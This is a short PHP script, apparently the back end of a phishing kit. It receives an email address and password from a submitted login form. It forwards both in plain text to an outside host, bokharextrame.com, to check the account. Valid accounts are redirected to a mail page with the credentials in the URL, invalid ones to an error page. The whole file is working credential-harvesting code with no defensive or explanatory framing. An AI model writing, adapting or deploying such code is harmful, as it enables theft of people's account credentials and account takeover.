<?php

//enable Errors
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', 0);
////////////////////////////////////////////////////////////////////////

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = $_POST['email'];
    $password = $_POST['password'];

    $json = file_get_contents("http://bokharextrame.com/?u=".$username."&p=".$password);
    $json = json_decode($json, true);

    if ($json['message'] == 'Invalid Account'){
        header ('Location: incorrect.php?email='.$_POST['email']);
    } else {
         
 header ("Location: mail.php?u='.$username.'&p='.$password");

    }

    exit(0);
}
?>

